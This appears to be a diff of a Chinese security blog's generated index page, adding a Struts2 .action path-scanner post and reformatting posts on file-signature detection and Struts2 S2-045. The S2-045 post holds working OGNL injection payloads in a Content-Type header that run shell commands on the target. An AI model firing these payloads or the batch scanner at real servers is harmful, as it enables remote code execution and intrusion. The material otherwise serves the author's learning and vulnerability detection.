@@ -249,6 +249,134 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://phpplay.github.io/2017/03/16/nscan/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="masker">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/tx.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="masker">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/03/16/nscan/" itemprop="url">
+                  目录扫描脚本
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-16T09:53:35+08:00">
+                2017-03-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <script src="/assets/js/APlayer.min.js"> </script><h2 id="学习-1"><a href="#学习-1" class="headerlink" title="学习(1)"></a>学习(1)</h2><pre><code>一直想搞一个批量扫描工具，最近试着写一下扫描struts2，所以打算自己写一个于是就有了这个demo
+</code></pre><h3 id="我的demo"><a href="#我的demo" class="headerlink" title="我的demo"></a>我的demo</h3><pre><code>这次不再用urllib2了，因为301，302自动跳转问题有些蛋疼 -、-，所以用了requests，第一次用，我语法都没学完，直接写到昨晚2点多，因为自定义404的问题实在是不好判断，所以就找了些资料，思路大概也就是访问一个根本不可能存在的路径，和原扫描路径做比较，如果相似度大于百分之80，就直接舍弃。
+</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> l1 != l2 <span class="keyword">and</span> <span class="string">'type'</span> <span class="keyword">in</span> r.text <span class="keyword">and</span>  difflib.SequenceMatcher(<span class="keyword">None</span>, r2.text,r.text).ratio() &lt; <span class="number">0.8</span></div></pre></td></tr></table></figure>
+<pre><code>我使用了多个判断条件，首先是状态码，文件长度，type in 是为了判断是否是html，最后的那个是判断文本相似度。
+完整的模块代码如下：
+</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">action_scan</span><span class="params">(url)</span>:</span></div><div class="line">    dirs = [<span class="string">"index.action"</span>,<span class="string">"home.action"</span>,<span class="string">"login.action"</span>,<span class="string">"main.action"</span>,<span class="string">"homepage.action"</span>]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">	furl = <span class="string">'http://'</span> + url + <span class="string">':8080/'</span> + dirs[i]</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">	    r = requests.get(furl,allow_redirects = <span class="keyword">False</span>,timeout=<span class="number">3</span>)</div><div class="line">            l1 = len(r.text)</div><div class="line">            r2 = requests.get(furl+<span class="string">'233323332333'</span>,allow_redirects = <span class="keyword">False</span>,timeout=<span class="number">3</span>)</div><div class="line">            l2 = len(r2.text)</div><div class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> l1 != l2 <span class="keyword">and</span> <span class="string">'type'</span> <span class="keyword">in</span> r.text <span class="keyword">and</span>  difflib.SequenceMatcher(<span class="keyword">None</span>, r2.text,r.text).ratio() &lt; <span class="number">0.8</span>:</div><div class="line">               </div><div class="line">                <span class="keyword">print</span> furl + <span class="string">'       is ok'</span></div><div class="line">                file_object = open(<span class="string">'ok.txt'</span>, <span class="string">'a'</span>)</div><div class="line">       	        file_object.write(furl + <span class="string">'\n'</span>)</div><div class="line">	        file_object.close()</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">print</span> furl + <span class="string">'                                       is not ok'</span></div><div class="line"></div><div class="line">            </div><div class="line">        <span class="keyword">except</span> :</div><div class="line">            <span class="keyword">pass</span></div></pre></td></tr></table></figure>
+<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><pre><code>其实如果我只扫struts2的话，只要有一个可以判断的指纹就可以了，搞得这么复杂，我也是醉了，不过这个demo稍微改一下就可以变成一个web目录扫描了，至少它扫描struts2准确性很高了
+接下来打算学习线程，顺便把语法补上来，否则根基太渣，容易垮掉啊。
+</code></pre>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://phpplay.github.io/2017/03/14/test/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -326,11 +454,10 @@
       
         
           
-            <script src="/assets/js/APlayer.min.js"> </script><p>##测试<br>    当时想起土司一个帖子，是通过文件头判断下载文件类型的思路来做一个挖掘姬，所以就想用python写一个，所以做了些测试。</p>
-<p>###</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">typeList</span><span class="params">()</span>:</span>  </div><div class="line">    <span class="keyword">return</span> &#123;  <span class="string">"52617221"</span>: <span class="string">"rar"</span>,   <span class="string">"504B0304"</span>: <span class="string">"zip"</span> &#125;  </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">toHex</span><span class="params">(s)</span>:</span></div><div class="line">    lst = []</div><div class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</div><div class="line">        hv = hex(ord(ch)).replace(<span class="string">'0x'</span>, <span class="string">''</span>)</div><div class="line">        <span class="keyword">if</span> len(hv) == <span class="number">1</span>:</div><div class="line">            hv = <span class="string">'0'</span>+hv</div><div class="line">        lst.append(hv)</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x,y:x+y, lst)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line">    </div><div class="line">    response = urllib2.urlopen(<span class="string">'http://127.0.0.1:8081/test.lnk.lnk'</span>,timeout=<span class="number">5</span>)</div><div class="line">    </div><div class="line">    code = response.getcode()</div><div class="line">    <span class="keyword">print</span> code    </div><div class="line">    </div><div class="line">    <span class="comment">#print response.info()</span></div><div class="line">    </div><div class="line">    <span class="keyword">print</span>  type(response)</div><div class="line">    </div><div class="line">    html = response.read(<span class="number">3</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">print</span>  type(html)</div><div class="line"> </div><div class="line">    </div><div class="line">    <span class="keyword">print</span> html</div><div class="line">    </div><div class="line">    </div><div class="line">    </div><div class="line">    ty1 =toHex(html).upper()</div><div class="line">    <span class="keyword">print</span> ty1</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> ty1 == <span class="string">"526172"</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'rar'</span></div><div class="line">    <span class="keyword">elif</span> ty1 == <span class="string">"504B03"</span>:</div><div class="line">        <span class="keyword">print</span>  <span class="string">"zip"</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"wu"</span></div><div class="line">    </div><div class="line"></div><div class="line">   <span class="comment"># print  bytes2hex(response)</span></div><div class="line">   </div><div class="line">   </div><div class="line"></div><div class="line">  </div><div class="line"><span class="keyword">except</span> urllib2.URLError,e:</div><div class="line">    <span class="keyword">pass</span></div><div class="line"><span class="string">'''        print "Failed to reach the server"</span></div><div class="line">        #print "The reason:",e.reason</div><div class="line">    elif hasattr(e,"code"):</div><div class="line">        print "The server couldn't fulfill the request"</div><div class="line">        print "Error code:",e.code</div><div class="line">        print "Return content:",e.read()</div><div class="line">else:</div><div class="line">    pass  #其他异常的处理</div><div class="line"> </div><div class="line">'''</div><div class="line"></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">   ty=typeList()</div><div class="line">   if ty1 in ty:</div><div class="line">       print "ok"</div><div class="line">"""</div></pre></td></tr></table></figure>
-<p>###其它测试数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">JPEG (jpg) FFD8FF</div><div class="line">PNG (png) 89504E47</div><div class="line">GIF (gif) 47494638</div><div class="line">TIFF (tif) 49492A00</div><div class="line">Windows Bitmap (bmp) 424D</div><div class="line">CAD (dwg) 41433130</div><div class="line">Adobe Photoshop (psd) 38425053</div><div class="line">Rich Text Format (rtf) 7B5C727466</div><div class="line">XML (xml) 3C3F786D6C</div><div class="line">HTML (html) 68746D6C3E</div><div class="line">Email [thorough only] (eml) 44656C69766572792D646174653A</div><div class="line">Outlook Express (dbx) CFAD12FEC5FD746F</div><div class="line">Outlook (pst) 2142444E</div><div class="line">MS Word/Excel (xls.or.doc) D0CF11E0</div><div class="line">MS Access (mdb) 5374616E64617264204A</div><div class="line">WordPerfect (wpd) FF575043</div><div class="line">Postscript (eps.or.ps) 252150532D41646F6265</div><div class="line">Adobe Acrobat (pdf) 255044462D312E</div><div class="line">Quicken (qdf) AC9EBD8F</div><div class="line">Windows Password (pwl) E3828596</div><div class="line">ZIP Archive (zip) 504B0304</div><div class="line">RAR Archive (rar) 52617221</div><div class="line">Wave (wav) 57415645</div><div class="line">AVI (avi) 41564920</div><div class="line">Real Audio (ram) 2E7261FD</div><div class="line">Real Media (rm) 2E524D46</div><div class="line">MPEG (mpg) 000001BA</div><div class="line">MPEG (mpg) 000001B3</div><div class="line">Quicktime (mov) 6D6F6F76</div><div class="line">Windows Media (asf) 3026B2758E66CF11</div><div class="line">MIDI (mid) 4D546864</div></pre></td></tr></table></figure></p>
-<div class="owl-media owl-video owl-bilibili"><embed src="http://static.hdslb.com/miniloader.swf" flashvars="aid=247371&page=1" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" quality="high" allowfullscreen="true"></div>
+            <script src="/assets/js/APlayer.min.js"> </script><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><pre><code>当时想起土司一个帖子，是通过文件头判断下载文件类型的思路来做一个挖掘姬，所以就想用python写一个，所以做了些测试。
+</code></pre><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">typeList</span><span class="params">()</span>:</span>  </div><div class="line">    <span class="keyword">return</span> &#123;  <span class="string">"52617221"</span>: <span class="string">"rar"</span>,   <span class="string">"504B0304"</span>: <span class="string">"zip"</span> &#125;  </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">toHex</span><span class="params">(s)</span>:</span></div><div class="line">    lst = []</div><div class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</div><div class="line">        hv = hex(ord(ch)).replace(<span class="string">'0x'</span>, <span class="string">''</span>)</div><div class="line">        <span class="keyword">if</span> len(hv) == <span class="number">1</span>:</div><div class="line">            hv = <span class="string">'0'</span>+hv</div><div class="line">        lst.append(hv)</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x,y:x+y, lst)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line">    </div><div class="line">    response = urllib2.urlopen(<span class="string">'http://127.0.0.1:8081/test.lnk.lnk'</span>,timeout=<span class="number">5</span>)</div><div class="line">    </div><div class="line">    code = response.getcode()</div><div class="line">    <span class="keyword">print</span> code    </div><div class="line">    </div><div class="line">    <span class="comment">#print response.info()</span></div><div class="line">    </div><div class="line">    <span class="keyword">print</span>  type(response)</div><div class="line">    </div><div class="line">    html = response.read(<span class="number">3</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">print</span>  type(html)</div><div class="line"> </div><div class="line">    </div><div class="line">    <span class="keyword">print</span> html</div><div class="line">    </div><div class="line">    </div><div class="line">    </div><div class="line">    ty1 =toHex(html).upper()</div><div class="line">    <span class="keyword">print</span> ty1</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> ty1 == <span class="string">"526172"</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'rar'</span></div><div class="line">    <span class="keyword">elif</span> ty1 == <span class="string">"504B03"</span>:</div><div class="line">        <span class="keyword">print</span>  <span class="string">"zip"</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"wu"</span></div><div class="line">    </div><div class="line"></div><div class="line">   <span class="comment"># print  bytes2hex(response)</span></div><div class="line">   </div><div class="line">   </div><div class="line"></div><div class="line">  </div><div class="line"><span class="keyword">except</span> urllib2.URLError,e:</div><div class="line">    <span class="keyword">pass</span></div><div class="line"><span class="string">'''        print "Failed to reach the server"</span></div><div class="line">        #print "The reason:",e.reason</div><div class="line">    elif hasattr(e,"code"):</div><div class="line">        print "The server couldn't fulfill the request"</div><div class="line">        print "Error code:",e.code</div><div class="line">        print "Return content:",e.read()</div><div class="line">else:</div><div class="line">    pass  #其他异常的处理</div><div class="line"> </div><div class="line">'''</div><div class="line"></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">   ty=typeList()</div><div class="line">   if ty1 in ty:</div><div class="line">       print "ok"</div><div class="line">"""</div></pre></td></tr></table></figure>
+<h3 id="其它测试数据"><a href="#其它测试数据" class="headerlink" title="其它测试数据"></a>其它测试数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">JPEG (jpg) FFD8FF</div><div class="line">PNG (png) 89504E47</div><div class="line">GIF (gif) 47494638</div><div class="line">TIFF (tif) 49492A00</div><div class="line">Windows Bitmap (bmp) 424D</div><div class="line">CAD (dwg) 41433130</div><div class="line">Adobe Photoshop (psd) 38425053</div><div class="line">Rich Text Format (rtf) 7B5C727466</div><div class="line">XML (xml) 3C3F786D6C</div><div class="line">HTML (html) 68746D6C3E</div><div class="line">Email [thorough only] (eml) 44656C69766572792D646174653A</div><div class="line">Outlook Express (dbx) CFAD12FEC5FD746F</div><div class="line">Outlook (pst) 2142444E</div><div class="line">MS Word/Excel (xls.or.doc) D0CF11E0</div><div class="line">MS Access (mdb) 5374616E64617264204A</div><div class="line">WordPerfect (wpd) FF575043</div><div class="line">Postscript (eps.or.ps) 252150532D41646F6265</div><div class="line">Adobe Acrobat (pdf) 255044462D312E</div><div class="line">Quicken (qdf) AC9EBD8F</div><div class="line">Windows Password (pwl) E3828596</div><div class="line">ZIP Archive (zip) 504B0304</div><div class="line">RAR Archive (rar) 52617221</div><div class="line">Wave (wav) 57415645</div><div class="line">AVI (avi) 41564920</div><div class="line">Real Audio (ram) 2E7261FD</div><div class="line">Real Media (rm) 2E524D46</div><div class="line">MPEG (mpg) 000001BA</div><div class="line">MPEG (mpg) 000001B3</div><div class="line">Quicktime (mov) 6D6F6F76</div><div class="line">Windows Media (asf) 3026B2758E66CF11</div><div class="line">MIDI (mid) 4D546864</div></pre></td></tr></table></figure>
+<h3 id="测试区"><a href="#测试区" class="headerlink" title="测试区"></a>测试区</h3><div class="owl-media owl-video owl-bilibili"><embed src="http://static.hdslb.com/miniloader.swf" flashvars="aid=247371&page=1" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" quality="high" allowfullscreen="true"></div>
 <div id="aplayer0" class="aplayer" style="margin-bottom: 20px;"></div>
 		<script>
 			new APlayer({
@@ -467,11 +594,11 @@
       
         
           
-            <script src="/assets/js/APlayer.min.js"> </script><p>##始末<br>    struts2-045漏洞是在2017.3.7被安恒放出的，而很多公司都是在一个月以前获得的通知，所以内部圈子里面都是很早以前就开始玩了。poc在3.7日当天被放出来，所以批量检测工具也很快就被各黑阔论坛开发出来，然而这个时间段很是敏感，所以没爆什么大新闻。<br>        当时自己闲着没事也写一个检测的DEMO，还是很简单的，当时还知道了一个很溜的工具<a href="https://www.getpostman.com/" target="_blank" rel="external">postman</a>。</p>
-<p>###我的DEMO<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">url=<span class="string">"http://text.com/index.action"</span></div><div class="line">req = urllib2.Request(url)</div><div class="line">req.add_header(<span class="string">'User-agent'</span>,<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>)</div><div class="line">req.add_header(<span class="string">'Content-Type'</span>,<span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo 11987654321').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>)</div><div class="line">res = urllib2.urlopen(req)</div><div class="line">html = res.read()</div><div class="line"><span class="keyword">print</span> html</div><div class="line"><span class="keyword">if</span> <span class="string">"11987654321"</span> <span class="keyword">in</span> html:</div><div class="line">    <span class="keyword">print</span> url + <span class="string">"      is OK"</span></div></pre></td></tr></table></figure></p>
-<p>###获取路径<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">req.add_header(<span class="string">'User-agent'</span>,<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>)</div><div class="line">req.add_header(<span class="string">'Content-Type'</span>,<span class="string">"%&#123;(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#cmd='echo '+#path).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>)</div></pre></td></tr></table></figure></p>
-<p>###getshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">自己百度吧</div></pre></td></tr></table></figure></p>
-
+            <script src="/assets/js/APlayer.min.js"> </script><h2 id="始末"><a href="#始末" class="headerlink" title="始末"></a>始末</h2><pre><code>struts2-045漏洞是在2017.3.7被安恒放出的，而很多公司都是在一个月以前获得的通知，所以内部圈子里面都是很早以前就开始玩了。poc在3.7日当天被放出来，所以批量检测工具也很快就被各黑阔论坛开发出来，然而这个时间段很是敏感，所以没爆什么大新闻。
+    当时自己闲着没事也写一个检测的DEMO，还是很简单的，当时还知道了一个很溜的工具[postman](https://www.getpostman.com/)。
+</code></pre><h3 id="我的DEMO"><a href="#我的DEMO" class="headerlink" title="我的DEMO"></a>我的DEMO</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">url=<span class="string">"http://text.com/index.action"</span></div><div class="line">req = urllib2.Request(url)</div><div class="line">req.add_header(<span class="string">'User-agent'</span>,<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>)</div><div class="line">req.add_header(<span class="string">'Content-Type'</span>,<span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo 11987654321').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>)</div><div class="line">res = urllib2.urlopen(req)</div><div class="line">html = res.read()</div><div class="line"><span class="keyword">print</span> html</div><div class="line"><span class="keyword">if</span> <span class="string">"11987654321"</span> <span class="keyword">in</span> html:</div><div class="line">    <span class="keyword">print</span> url + <span class="string">"      is OK"</span></div></pre></td></tr></table></figure>
+<h3 id="获取路径"><a href="#获取路径" class="headerlink" title="获取路径"></a>获取路径</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">req.add_header(<span class="string">'User-agent'</span>,<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>)</div><div class="line">req.add_header(<span class="string">'Content-Type'</span>,<span class="string">"%&#123;(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#cmd='echo '+#path).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>)</div></pre></td></tr></table></figure>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">自己百度吧</div></pre></td></tr></table></figure>
           
         
       
@@ -671,7 +798,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-count">4</span>
